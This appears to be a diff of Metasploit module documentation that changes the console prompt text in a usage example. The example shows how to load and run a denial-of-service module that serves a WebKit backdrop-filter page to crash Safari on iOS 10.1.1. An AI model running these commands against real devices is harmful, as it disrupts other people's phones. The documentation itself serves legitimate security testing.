@@ -18,10 +18,10 @@ The device will "re-spring" the operating system, but not actually restart the d
 ### Safari 602.1 on iOS 10.1.1
 
 ```
-msf5 > use auxiliary/dos/apple_ios/webkit_backdrop_filter_blur
-msf5 auxiliary(dos/apple_ios/webkit_backdrop_filter_blur) > set URIPATH /
+msf > use auxiliary/dos/apple_ios/webkit_backdrop_filter_blur
+msf auxiliary(dos/apple_ios/webkit_backdrop_filter_blur) > set URIPATH /
 URIPATH => /
-msf5 auxiliary(dos/apple_ios/webkit_backdrop_filter_blur) > run
+msf auxiliary(dos/apple_ios/webkit_backdrop_filter_blur) > run
 
 [*] Using URL: http://0.0.0.0:8080/
 [*] Local IP: http://192.168.0.1:8080/
